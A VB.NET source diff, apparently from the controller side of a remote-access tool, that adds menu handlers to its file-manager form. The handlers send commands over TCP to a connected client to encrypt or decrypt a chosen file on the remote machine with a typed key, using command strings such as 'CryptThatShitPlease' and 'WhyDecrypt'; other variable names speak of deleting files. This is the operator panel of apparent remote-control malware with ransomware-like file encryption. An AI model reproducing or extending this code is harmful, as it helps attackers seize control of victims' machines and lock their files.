@@ -25,8 +25,8 @@ Public Class FMM
                 If theendpoint = client.Client.RemoteEndPoint.ToString Then
 
                     Try
-                        client.GetStream().Write(buffer, 0, buffer.Length) '''
-                    Catch ex As Exception
+                    client.GetStream().Write(buffer, 0, buffer.Length)
+                Catch ex As Exception
 
                         MessageBox.Show("The client seems to be offline")
                     End Try
@@ -128,5 +128,89 @@ Public Class FMM
         Next
 
 
+    End Sub
+
+    Private Sub FMM_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+    End Sub
+
+    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
+
+    End Sub
+
+    Private Sub Label3_TextChanged(sender As Object, e As EventArgs) Handles Label3.TextChanged
+        If Label3.Text.Contains("\\") Then
+            Label3.Text.Replace("\\", "\")
+        End If
+    End Sub
+
+    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
+        Dim ThefileOrFolrderToDelete As String = Label3.Text + "\" + ListView1.SelectedItems(0).Text
+        Dim theendpoint As String = Me.Text
+        Dim Itstimetodeleteselectedfile As String
+        Dim o As String = InputBox("Put a key to encrypt : ")
+        If ListView1.SelectedItems(0).ImageKey = "files" Then
+
+
+            Itstimetodeleteselectedfile = "\CryptThatShitPlease/" + o
+
+            '       ElseIf ListView1.SelectedItems(0).ImageKey = "folders" Then
+        Else
+            MessageBox.Show("You've selected a folder !")
+            '   Itstimetodeleteselectedfile = "CryptThatShitPlease" + "FOLDERS" + o
+        End If
+
+        Dim AllToSend As String = ThefileOrFolrderToDelete + Itstimetodeleteselectedfile
+
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
+        For Each client As TcpClient In Heathen.LesClients
+
+            If theendpoint = client.Client.RemoteEndPoint.ToString Then
+
+                Try
+                    client.GetStream().Write(buffer, 0, buffer.Length) '''
+                Catch ex As Exception
+
+                    MessageBox.Show("The client seems to be offline")
+                End Try
+            End If
+
+        Next
+    End Sub
+
+    Private Sub DecryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptToolStripMenuItem.Click
+        Dim ThefileOrFolrderToDelete As String = Label3.Text + "\" + ListView1.SelectedItems(0).Text
+        Dim theendpoint As String = Me.Text
+        Dim Itstimetodeleteselectedfile As String
+        Dim o As String = InputBox("Put a key to decrypt : ")
+        If ListView1.SelectedItems(0).ImageKey = "files" Then
+
+
+            Itstimetodeleteselectedfile = "\WhyDecrypt/" + o
+
+
+        Else
+            MessageBox.Show("You've selected a folder !")
+
+        End If
+
+        Dim AllToSend As String = ThefileOrFolrderToDelete + Itstimetodeleteselectedfile
+
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
+        For Each client As TcpClient In Heathen.LesClients
+
+            If theendpoint = client.Client.RemoteEndPoint.ToString Then
+
+                Try
+                    client.GetStream().Write(buffer, 0, buffer.Length) '''
+                Catch ex As Exception
+
+                    MessageBox.Show("The client seems to be offline")
+                End Try
+            End If
+
+        Next
     End Sub
 End Class
